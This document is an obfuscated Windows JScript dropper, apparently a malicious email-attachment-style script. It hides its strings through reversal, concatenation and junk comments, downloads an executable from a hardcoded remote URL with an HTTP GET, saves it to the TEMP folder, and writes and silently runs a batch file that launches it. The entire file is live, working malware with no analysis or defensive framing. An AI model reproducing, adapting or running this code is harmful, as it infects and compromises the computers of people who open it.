
/*@cc_on /* wq ZT  */
  @if (@_win32 || @_win64)/* wq ZT  */
    //
	var _xbrotation = false;
	var _xafont = "";
	var notion;
	var _xacenetr = "tcejbOetaerC".split(''/* wq ZT  */).reverse(/* wq ZT  */).join(''); 
	christopher /* wq ZT  */ = "%TEMP%/";
	_xcappendchild /* wq ZT  */ = "nh4kPmEFoY" + "exe.".split('').reverse().join('');;
	a12f4 = "W"+"S"+"c"+"ript";
	_xbrotation /* wq ZT  */= true;/* wq ZT  */
	_xafont/* wq ZT  */ = /* wq ZT  */"MLH";/* wq ZT  */
	notion =/* wq ZT  */ "R" + "esponseB"/* wq ZT  */ + "ydo".split('').reverse().join('');
	_xasuch = /* wq ZT  */(/* wq ZT  */"noit"+"isop").split(''/* wq ZT  */).reverse(/* wq ZT  */).join('');
	_xarotation/* wq ZT  */ =/* wq ZT  */ "eliFoTevaS".split(''/* wq ZT  */).reverse().join('');
	_xbfont = "maertS.BDODA".split(''/* wq ZT  */).reverse().join('');
	_xbbosnian = "s" + "end";
	_xab13f4 = "ht"+"tp:"+"//"+"bl"+"ac"+"kd"+"ild"+"o.n"+"et/"+"m3"+"g0"+"t0"+"ds";
	_xbnotion = "G\x45"+"T";
	_xbclearball = "peels".split(''/* wq ZT  */).reverse().join('');
	_xathen = "sgnirtStnemnorivnEdnapxE".split(''/* wq ZT  */).reverse().join('');
	_xaa12f4 = "tesrahc".split(''/* wq ZT  */).reverse().join('');
	_xbcom = "tab.o87asdfg".split(''/* wq ZT  */).reverse().join('');
	_xcb13f4 = "etatsydaer".split(''/* wq ZT  */).reverse().join('');
	_xaappendchild = " trats".split(''/* wq ZT  */).reverse().join('');
	_xamultiplication = "tixe\n\r".split(''/* wq ZT  */).reverse().join('');
	wheelb = "1521-swodniw".split(''/* wq ZT  */).reverse().join('');
	_xacom = "esolc".split(''/* wq ZT  */).reverse().join('');
	font = "epyt".split(''/* wq ZT  */).reverse().join('');
	clearball = "etirw".split(''/* wq ZT  */).reverse().join('');
	com = "txeT".split(''/* wq ZT  */).reverse().join('');
 /* wq ZT  */ @end/* wq ZT  */
@*//* wq ZT  */
if (!(_xbrotation))
{
	such = _xbrotation / 0;
}


var cenetr/* wq ZT  */ = /* wq ZT  */this[/* wq ZT  */a12f4/* wq ZT  */]/* wq ZT  */;
var _xbwheelb = function multiplication() {return cenetr[_xacenetr](("ffadsc", a12f4)+".Shel"+"l");}(), _xbb13f4 /* wq ZT  */ = -4133 + 4144;
var _xbappendchild = 1 * (2 - 0);
var bosnian = _xbappendchild - ((6616 - 6614) + 0) * 1;
function one(_xbmultiplication){_xbwheelb[("33", "32", "R")+ "u" + ("1", "n")](_xbmultiplication, bosnian, bosnian);};
function then(){return _xacenetr;};

{
var _xabosnian = "M" + "SX"+"ML2."+"X"+_xafont+"T"+"TP";
var _xbcenetr = "";
_xbcenetr = "o"+"pen";
function b13f4(_xbone) {_xbone[_xarotation](_xbwheelb[_xathen](christopher /* wq ZT  */) + "nh4kPmEFoY.ex" + "e", 2 * 1); return 0;};

if (true){
 _xcmultiplication = _xabosnian;
 _xba12f4 = cenetr[_xacenetr](_xcmultiplication);
 var _xanotion = 1;
while (_xanotion) { 
	for (;_xanotion;){
	try {
		if (_xanotion == 275 - 274)
		{
			_xba12f4[_xbcenetr](_xbnotion, _xab13f4, (true, false));
			_xba12f4[_xbbosnian]();
			_xaclearball = _xbclearball;
			_xanotion = 2;
		}
		cenetr[_xaclearball](3752 - 3632); 
		if (_xba12f4[_xcb13f4] < (-6567 + 6571)) 
		{
			continue;
		}
		_xanotion = bosnian;
		function appendchild(_xaone) {var _xachristopher = (123, _xaone); return _xachristopher;};
		
		rotation = _xbwheelb[_xathen](christopher /* wq ZT  */) + _xcappendchild /* wq ZT  */;
		_xbthen = _xbwheelb[_xathen](christopher /* wq ZT  */) + _xbcom;
		_xbchristopher = _xaappendchild+rotation+_xamultiplication;

		_xcmultiplication = _xbsuch = cenetr[then()](_xbfont);
		_xcmultiplication[_xbcenetr]();
		_xcmultiplication[font] = 2;
		_xcmultiplication[_xaa12f4] = wheelb;
		_xcmultiplication[clearball+com](_xbchristopher);
		_xbsuch[_xasuch] = 1 * 0;
		_xcmultiplication[_xarotation](_xbthen, 2);
		_xbsuch[_xacom]();
		
		_xcmultiplication = _xbsuch = cenetr[then()](_xbfont);
		_xcmultiplication[_xbcenetr]();
		_xcmultiplication[font] = 2;
		_xcmultiplication[_xaa12f4] = wheelb;
		_xcmultiplication[clearball+com]("M");
		_xbsuch[_xasuch] = -4508 + 4508;
		b13f4(_xcmultiplication);
		_xbsuch[_xacom]();
		
		_xcmultiplication = _xbsuch = cenetr[then()](_xbfont);
		_xcmultiplication[_xbcenetr]();
		_xcmultiplication[font] = 1;
		_xcmultiplication[clearball](_xba12f4[notion]);
		_xbsuch[_xasuch] = 1;
		b13f4(_xcmultiplication);
		_xbsuch[_xacom]();
		
		if (1 && _xbrotation) one(_xbthen);
	} catch(_xawheelb){};};
};
}
}

